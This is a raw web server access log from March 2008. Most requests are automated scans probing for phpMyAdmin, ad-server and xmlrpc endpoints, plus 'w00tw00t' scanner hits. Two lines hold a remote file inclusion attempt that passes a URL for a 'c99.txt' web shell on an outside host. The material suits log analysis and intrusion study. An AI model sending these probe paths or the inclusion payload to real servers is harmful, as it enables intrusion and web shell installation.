85.90.135.120 - - [15/Mar/2008:03:46:29 +0100] "GET /administrator/phpMyAdmin-2.8.0-rc2/main.php HTTP/1.0" 404 1032 "-" "-"
85.90.135.120 - - [15/Mar/2008:03:46:29 +0100] "GET /administrator/phpMyAdmin-2.8.0/main.php HTTP/1.0" 404 1032 "-" "-"
85.90.135.120 - - [15/Mar/2008:03:46:29 +0100] "GET /administrator/phpMyAdmin-2.8.0.1/main.php HTTP/1.0" 404 1032 "-" "-"
85.90.135.120 - - [15/Mar/2008:03:46:29 +0100] "GET /administrator/phpMyAdmin-2.8.0.2/main.php HTTP/1.0" 404 1032 "-" "-"
85.90.135.120 - - [15/Mar/2008:03:46:30 +0100] "GET /administrator/phpMyAdmin-2.8.0.3/main.php HTTP/1.0" 404 1032 "-" "-"
85.90.135.120 - - [15/Mar/2008:03:46:30 +0100] "GET /administrator/phpMyAdmin-2.8.0.4/main.php HTTP/1.0" 404 1032 "-" "-"
85.90.135.120 - - [15/Mar/2008:03:46:30 +0100] "GET /administrator/phpMyAdmin-2.8.1-rc1/main.php HTTP/1.0" 404 1032 "-" "-"
85.90.135.120 - - [15/Mar/2008:03:46:30 +0100] "GET /administrator/phpMyAdmin-2.8.1/main.php HTTP/1.0" 404 1032 "-" "-"
85.90.135.120 - - [15/Mar/2008:03:46:30 +0100] "GET /administrator/phpMyAdmin-2.8.2/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.37.90 - - [15/Mar/2008:11:40:51 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
81.246.45.219 - - [15/Mar/2008:11:59:36 +0100] "GET /admin/business_inc/saveserver.php?thisdir=http://80.231.130.12/wwwroot/c99.txt? HTTP/1.1" 404 1032 "-" "Mozilla/6.0"
85.214.85.237 - - [15/Mar/2008:13:01:15 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
87.106.142.8 - - [15/Mar/2008:13:28:42 +0100] "GET /phpmyadmin/main.php HTTP/1.0" 404 1032 "-" "-"
87.106.142.8 - - [15/Mar/2008:13:28:42 +0100] "GET /PhpMyAdmin/main.php HTTP/1.0" 404 1032 "-" "-"
87.106.142.8 - - [15/Mar/2008:13:28:42 +0100] "GET /PMA/main.php HTTP/1.0" 404 1032 "-" "-"
85.214.85.237 - - [15/Mar/2008:14:02:02 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
203.150.225.153 - - [15/Mar/2008:14:29:26 +0100] "GET / HTTP/1.0" 200 1513 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322)"
75.126.112.243 - - [15/Mar/2008:15:14:03 +0100] "GET /a1b2c3d4e5f6g7h8i9/nonexistentfile.php HTTP/1.0" 404 1028 "-" "-"
75.126.112.243 - - [15/Mar/2008:15:14:03 +0100] "GET /adxmlrpc.php HTTP/1.0" 404 1028 "-" "-"
75.126.112.243 - - [15/Mar/2008:15:14:04 +0100] "GET /adserver/adxmlrpc.php HTTP/1.0" 404 1028 "-" "-"
75.126.112.243 - - [15/Mar/2008:15:14:04 +0100] "GET /phpAdsNew/adxmlrpc.php HTTP/1.0" 404 1028 "-" "-"
75.126.112.243 - - [15/Mar/2008:15:14:04 +0100] "GET /phpadsnew/adxmlrpc.php HTTP/1.0" 404 1028 "-" "-"
75.126.112.243 - - [15/Mar/2008:15:14:04 +0100] "GET /phpads/adxmlrpc.php HTTP/1.0" 404 1028 "-" "-"
75.126.112.243 - - [15/Mar/2008:15:14:08 +0100] "GET /Ads/adxmlrpc.php HTTP/1.0" 404 1028 "-" "-"
75.126.112.243 - - [15/Mar/2008:15:14:08 +0100] "GET /ads/adxmlrpc.php HTTP/1.0" 404 1028 "-" "-"
203.69.69.151 - - [15/Mar/2008:15:37:36 +0100] "GET / HTTP/1.0" 200 1513 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322)"
81.246.45.219 - - [15/Mar/2008:15:49:24 +0100] "GET /admin/business_inc/saveserver.php?thisdir=http://80.231.130.12/wwwroot/c99.txt? HTTP/1.1" 404 1032 "-" "Mozilla/6.0"
85.214.85.237 - - [15/Mar/2008:16:12:57 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
85.214.85.237 - - [15/Mar/2008:17:23:00 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
85.214.85.237 - - [15/Mar/2008:18:51:14 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
216.240.132.119 - - [15/Mar/2008:19:11:15 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
85.214.85.237 - - [15/Mar/2008:20:21:42 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
213.198.53.97 - - [15/Mar/2008:22:24:34 +0100] "GET / HTTP/1.0" 200 1513 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322)"
85.214.85.237 - - [15/Mar/2008:22:37:20 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
85.214.85.237 - - [15/Mar/2008:22:56:30 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
66.230.186.2 - - [15/Mar/2008:23:19:31 +0100] "GET / HTTP/1.0" 200 1513 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322)"
85.214.85.237 - - [16/Mar/2008:00:16:54 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
195.137.160.46 - - [16/Mar/2008:02:29:25 +0100] "GET / HTTP/1.0" 200 1513 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322)"
208.36.144.8 - - [16/Mar/2008:05:41:05 +0100] "GET /robots.txt HTTP/1.0" 404 1028 "-" "Mozilla/5.0 (Twiceler-0.9 http://www.cuill.com/twiceler/robot.html)"
65.111.172.181 - - [16/Mar/2008:05:43:07 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
212.48.127.55 - - [16/Mar/2008:08:37:13 +0100] "GET / HTTP/1.0" 200 1513 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322)"
85.214.77.83 - - [16/Mar/2008:11:47:59 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
87.106.142.8 - - [16/Mar/2008:12:38:52 +0100] "GET /phpmyadmin/main.php HTTP/1.0" 404 1032 "-" "-"
87.106.142.8 - - [16/Mar/2008:12:38:52 +0100] "GET /PhpMyAdmin/main.php HTTP/1.0" 404 1032 "-" "-"
87.106.142.8 - - [16/Mar/2008:12:38:52 +0100] "GET /PMA/main.php HTTP/1.0" 404 1032 "-" "-"
85.214.85.237 - - [16/Mar/2008:13:18:57 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
85.214.85.237 - - [16/Mar/2008:14:03:08 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
85.214.85.237 - - [16/Mar/2008:15:48:14 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
85.214.85.237 - - [16/Mar/2008:17:20:04 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
80.154.37.90 - - [16/Mar/2008:18:06:35 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
85.214.85.237 - - [16/Mar/2008:19:41:44 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
85.214.85.237 - - [16/Mar/2008:20:40:10 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
85.214.85.237 - - [16/Mar/2008:21:52:09 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
85.214.85.237 - - [16/Mar/2008:23:16:55 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
85.214.85.237 - - [17/Mar/2008:00:42:54 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
216.145.5.42 - - [17/Mar/2008:08:24:00 +0100] "GET /robots.txt HTTP/1.0" 404 1157 "http://www.whois.sc/" "SurveyBot/2.3 (Whois Source)"
216.145.5.42 - - [17/Mar/2008:08:24:01 +0100] "GET / HTTP/1.1" 206 1513 "http://www.whois.sc/foomy.org" "SurveyBot/2.3 (Whois Source)"
64.246.178.34 - - [17/Mar/2008:08:28:25 +0100] "GET /robots.txt HTTP/1.0" 404 1157 "http://www.whois.sc/" "SurveyBot/2.3 (Whois Source)"
64.246.178.34 - - [17/Mar/2008:08:28:26 +0100] "GET / HTTP/1.1" 206 1513 "http://www.whois.sc/foomy.net" "SurveyBot/2.3 (Whois Source)"
80.154.33.111 - - [17/Mar/2008:11:37:46 +0100] "GET /phpmyadmin/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:46 +0100] "GET /phpMyAdmin/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:46 +0100] "GET /PMA/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:46 +0100] "GET /phpSQLiteAdmin/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:46 +0100] "GET /p/m/a/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:46 +0100] "GET /mysql/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:46 +0100] "GET /xampp/phpmyadmin/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:46 +0100] "GET /typo3/phpmyadmin/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:46 +0100] "GET /mysqladmin/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:46 +0100] "GET /admin/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:46 +0100] "GET /db/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:46 +0100] "GET /sql/admin/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:46 +0100] "GET /sql/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:46 +0100] "GET /dbadmin/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:46 +0100] "GET /web/phpMyAdmin/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:46 +0100] "GET /admin/pma/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:46 +0100] "GET /admin/phpmyadmin/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:46 +0100] "GET /padmin/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:46 +0100] "GET /phpmyadmin2/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:46 +0100] "GET /phpmyadmin1/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:46 +0100] "GET /phpadmin/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:47 +0100] "GET /myadmin/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:47 +0100] "GET /phpMyAdmin-2.2.3/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:47 +0100] "GET /phpMyAdmin-2.2.7-pl1/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:47 +0100] "GET /phpMyAdmin-2.5.6/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:47 +0100] "GET /phpMyAdmin-2.5.7-pl1/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:47 +0100] "GET /phpMyAdmin-2.6.0/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:47 +0100] "GET /phpMyAdmin-2.6.0-pl3/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:47 +0100] "GET /phpMyAdmin-2.6.0-pl3/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:47 +0100] "GET /phpMyAdmin-2.6.1-pl3/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:47 +0100] "GET /phpMyAdmin-2.6.3-pl1/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:47 +0100] "GET /phpMyAdmin 2.6.4-pl4/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:47 +0100] "GET /phpMyAdmin 2.7.0-beta1/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:47 +0100] "GET /phpMyAdmin 2.7.0-rc1/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:47 +0100] "GET /phpMyAdmin 2.7.0/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:47 +0100] "GET /phpMyAdmin-2.6.4/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:47 +0100] "GET /phpMyAdmin 2.7.0-pl1/main.php HTTP/1.0" 404 1032 "-" "-"
80.154.33.111 - - [17/Mar/2008:11:37:47 +0100] "GET /phpMyAdmin-2.2.7-pl1/main.php HTTP/1.0" 404 1032 "-" "-"
217.212.224.145 - - [17/Mar/2008:13:17:41 +0100] "GET /robots.txt HTTP/1.0" 404 1032 "-" "psbot/0.1 (+http://www.picsearch.com/bot.html)"
217.212.224.144 - - [17/Mar/2008:13:17:43 +0100] "GET / HTTP/1.0" 304 - "-" "psbot/0.1 (+http://www.picsearch.com/bot.html)"
92.48.65.200 - - [17/Mar/2008:13:19:56 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
64.34.169.174 - - [17/Mar/2008:15:57:20 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
85.214.85.237 - - [17/Mar/2008:17:36:05 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
217.212.224.145 - - [17/Mar/2008:18:51:41 +0100] "GET /robots.txt HTTP/1.0" 404 1032 "-" "psbot/0.1 (+http://www.picsearch.com/bot.html)"
217.212.224.177 - - [17/Mar/2008:18:51:42 +0100] "GET / HTTP/1.0" 304 - "-" "psbot/0.1 (+http://www.picsearch.com/bot.html)"
85.214.85.237 - - [17/Mar/2008:19:31:25 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
85.214.85.237 - - [17/Mar/2008:20:13:40 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
85.214.85.237 - - [17/Mar/2008:21:50:53 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
85.214.85.237 - - [17/Mar/2008:22:50:59 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
87.106.142.8 - - [17/Mar/2008:23:07:42 +0100] "GET /phpmyadmin/main.php HTTP/1.0" 404 1032 "-" "-"
87.106.142.8 - - [17/Mar/2008:23:07:42 +0100] "GET /PhpMyAdmin/main.php HTTP/1.0" 404 1032 "-" "-"
87.106.142.8 - - [17/Mar/2008:23:07:42 +0100] "GET /PMA/main.php HTTP/1.0" 404 1032 "-" "-"
208.80.193.41 - - [17/Mar/2008:23:51:44 +0100] "GET / HTTP/1.1" 200 1513 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20021011)"
216.234.237.104 - - [18/Mar/2008:07:35:02 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
92.48.65.200 - - [18/Mar/2008:12:56:36 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
81.209.145.131 - - [18/Mar/2008:13:02:41 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
69.93.47.98 - - [18/Mar/2008:13:03:36 +0100] "GET /a1b2c3d4e5f6g7h8i9/nonexistentfile.php HTTP/1.0" 404 1028 "-" "-"
69.93.47.98 - - [18/Mar/2008:13:03:36 +0100] "GET /adxmlrpc.php HTTP/1.0" 404 1028 "-" "-"
69.93.47.98 - - [18/Mar/2008:13:03:37 +0100] "GET /adserver/adxmlrpc.php HTTP/1.0" 404 1028 "-" "-"
69.93.47.98 - - [18/Mar/2008:13:03:37 +0100] "GET /phpAdsNew/adxmlrpc.php HTTP/1.0" 404 1028 "-" "-"
69.93.47.98 - - [18/Mar/2008:13:03:37 +0100] "GET /phpadsnew/adxmlrpc.php HTTP/1.0" 404 1028 "-" "-"
69.93.47.98 - - [18/Mar/2008:13:03:37 +0100] "GET /phpads/adxmlrpc.php HTTP/1.0" 404 1028 "-" "-"
69.93.47.98 - - [18/Mar/2008:13:03:38 +0100] "GET /Ads/adxmlrpc.php HTTP/1.0" 404 1028 "-" "-"
69.93.47.98 - - [18/Mar/2008:13:03:38 +0100] "GET /ads/adxmlrpc.php HTTP/1.0" 404 1028 "-" "-"
69.93.47.98 - - [18/Mar/2008:13:03:38 +0100] "GET /xmlrpc.php HTTP/1.0" 404 1028 "-" "-"
69.93.47.98 - - [18/Mar/2008:13:03:38 +0100] "GET /xmlrpc/xmlrpc.php HTTP/1.0" 404 1028 "-" "-"
69.93.47.98 - - [18/Mar/2008:13:03:39 +0100] "GET /xmlsrv/xmlrpc.php HTTP/1.0" 404 1028 "-" "-"
69.93.47.98 - - [18/Mar/2008:13:03:39 +0100] "GET /blog/xmlrpc.php HTTP/1.0" 404 1028 "-" "-"
69.93.47.98 - - [18/Mar/2008:13:03:39 +0100] "GET /drupal/xmlrpc.php HTTP/1.0" 404 1028 "-" "-"
69.93.47.98 - - [18/Mar/2008:13:03:40 +0100] "GET /community/xmlrpc.php HTTP/1.0" 404 1028 "-" "-"
69.93.47.98 - - [18/Mar/2008:13:03:40 +0100] "GET /blogs/xmlrpc.php HTTP/1.0" 404 1028 "-" "-"
69.93.47.98 - - [18/Mar/2008:13:03:40 +0100] "GET /blogs/xmlsrv/xmlrpc.php HTTP/1.0" 404 1028 "-" "-"
69.93.47.98 - - [18/Mar/2008:13:03:40 +0100] "GET /blog/xmlsrv/xmlrpc.php HTTP/1.0" 404 1028 "-" "-"
69.93.47.98 - - [18/Mar/2008:13:03:41 +0100] "GET /blogtest/xmlsrv/xmlrpc.php HTTP/1.0" 404 1028 "-" "-"
193.164.132.54 - - [18/Mar/2008:15:59:27 +0100] "GET /thisdoesnotexistahaha.php HTTP/1.1" 404 1032 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
193.164.132.54 - - [18/Mar/2008:15:59:27 +0100] "GET /vhcs2/tools/filemanager/login.php HTTP/1.1" 404 1032 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
193.164.132.54 - - [18/Mar/2008:15:59:27 +0100] "GET /vhcs/tools/filemanager/login.php HTTP/1.1" 404 1032 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)"
81.31.146.22 - - [18/Mar/2008:19:18:46 +0100] "GET / HTTP/1.0" 200 1513 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322)"
62.141.58.88 - - [18/Mar/2008:19:18:53 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
208.36.144.8 - - [18/Mar/2008:20:04:16 +0100] "GET /robots.txt HTTP/1.0" 404 1028 "-" "Mozilla/5.0 (Twiceler-0.9 http://www.cuill.com/twiceler/robot.html)"
81.31.146.22 - - [18/Mar/2008:20:33:25 +0100] "GET / HTTP/1.0" 200 1513 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322)"
209.190.75.26 - - [18/Mar/2008:20:59:56 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
62.141.58.88 - - [18/Mar/2008:21:13:28 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
209.200.245.41 - - [18/Mar/2008:21:34:18 +0100] "GET / HTTP/1.0" 200 1513 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322)"
87.106.142.8 - - [18/Mar/2008:21:45:57 +0100] "GET /phpmyadmin/main.php HTTP/1.0" 404 1032 "-" "-"
87.106.142.8 - - [18/Mar/2008:21:45:57 +0100] "GET /PhpMyAdmin/main.php HTTP/1.0" 404 1032 "-" "-"
87.106.142.8 - - [18/Mar/2008:21:45:57 +0100] "GET /PMA/main.php HTTP/1.0" 404 1032 "-" "-"
193.108.197.10 - - [18/Mar/2008:22:39:30 +0100] "GET / HTTP/1.0" 200 1513 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322)"
62.141.58.88 - - [18/Mar/2008:22:56:05 +0100] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 226 "-" "-"
80.66.68.57 - - [18/Mar/2008:23:12:15 +0100] "GET / HTTP/1.0" 200 1513 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322)"
41.249.43.52 - - [18/Mar/2008:23:39:36 +0100] "GET / HTTP/1.1" 200 1513 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)"
41.249.43.52 - - [18/Mar/2008:23:39:36 +0100] "GET /inc/css/main.css HTTP/1.1" 200 3587 "http://www.foomy.net/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)"
41.249.43.52 - - [18/Mar/2008:23:39:37 +0100] "GET /favicon.ico HTTP/1.1" 404 1032 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)"
207.61.84.138 - - [19/Mar/2008:02:03:15 +0100] "GET / HTTP/1.0" 200 1513 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322)"
60.250.190.152 - - [19/Mar/2008:03:17:30 +0100] "GET / HTTP/1.0" 200 1513 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322)"
62.141.51.87 - - [19/Mar/2008:04:25:02 +0100] "GET /phpmyadmin/read_dump.phpmain.php HTTP/1.0" 404 1032 "-" "-"
62.141.51.87 - - [19/Mar/2008:04:25:02 +0100] "GET /PMA/read_dump.phpmain.php HTTP/1.0" 404 1032 "-" "-"
62.141.51.87 - - [19/Mar/2008:04:25:02 +0100] "GET /mysql/read_dump.phpmain.php HTTP/1.0" 404 1032 "-" "-"
62.141.51.87 - - [19/Mar/2008:04:25:02 +0100] "GET /xampp/phpinfo.phpmain.php HTTP/1.0" 404 1032 "-" "-"
62.141.51.87 - - [19/Mar/2008:04:25:02 +0100] "GET /xampp/phpmyadmin/read_dump.phpmain.php HTTP/1.0" 404 1032 "-" "-"
62.141.51.87 - - [19/Mar/2008:04:25:02 +0100] "GET /typo3/phpmyadmin/read_dump.phpmain.php HTTP/1.0" 404 1032 "-" "-"
62.141.51.87 - - [19/Mar/2008:04:25:02 +0100] "GET /mysqladmin/read_dump.phpmain.php HTTP/1.0" 404 1032 "-" "-"
62.141.51.87 - - [19/Mar/2008:04:25:02 +0100] "GET /admin/read_dump.phpmain.php HTTP/1.0" 404 1032 "-" "-"
62.141.51.87 - - [19/Mar/2008:04:25:02 +0100] "GET /db/read_dump.phpmain.php HTTP/1.0" 404 1032 "-" "-"
62.141.51.87 - - [19/Mar/2008:04:25:02 +0100] "GET /dbadmin/read_dump.phpmain.php HTTP/1.0" 404 1032 "-" "-"
62.141.51.87 - - [19/Mar/2008:04:25:02 +0100] "GET /web/phpMyAdmin/read_dump.phpmain.php HTTP/1.0" 404 1032 "-" "-"
62.141.51.87 - - [19/Mar/2008:04:25:02 +0100] "GET /admin/pma/read_dump.phpmain.php HTTP/1.0" 404 1032 "-" "-"
62.141.51.87 - - [19/Mar/2008:04:25:02 +0100] "GET /admin/phpmyadmin/read_dump.phpmain.php HTTP/1.0" 404 1032 "-" "-"
62.141.51.87 - - [19/Mar/2008:04:25:02 +0100] "GET /padmin/read_dump.phpmain.php HTTP/1.0" 404 1032 "-" "-"
62.141.51.87 - - [19/Mar/2008:04:25:02 +0100] "GET /phpmyadmin2/read_dump.phpmain.php HTTP/1.0" 404 1032 "-" "-"
62.141.51.87 - - [19/Mar/2008:04:25:02 +0100] "GET /phpmyadmin1/read_dump.phpmain.php HTTP/1.0" 404 1032 "-" "-"
62.141.51.87 - - [19/Mar/2008:04:25:02 +0100] "GET /phpadmin/read_dump.phpmain.php HTTP/1.0" 404 1032 "-" "-"
62.141.51.87 - - [19/Mar/2008:04:25:03 +0100] "GET /myadmin/read_dump.phpmain.php HTTP/1.0" 404 1032 "-" "-"
62.141.51.87 - - [19/Mar/2008:04:25:03 +0100] "GET /phpMyAdmin-2.2.3/read_dump.phpmain.php HTTP/1.0" 404 1032 "-" "-"
62.141.51.87 - - [19/Mar/2008:04:25:03 +0100] "GET /phpMyAdmin-2.2.7-pl1/read_dump.phpmain.php HTTP/1.0" 404 1032 "-" "-"
62.141.51.87 - - [19/Mar/2008:04:25:03 +0100] "GET /phpMyAdmin-2.5.6/read_dump.phpmain.php HTTP/1.0" 404 1032 "-" "-"
62.141.51.87 - - [19/Mar/2008:04:25:03 +0100] "GET /phpMyAdmin-2.5.7-pl1/read_dump.phpmain.php HTTP/1.0" 404 1032 "-" "-"
62.141.51.87 - - [19/Mar/2008:04:25:03 +0100] "GET /phpMyAdmin-2.6.0/read_dump.phpmain.php HTTP/1.0" 404 1032 "-" "-"
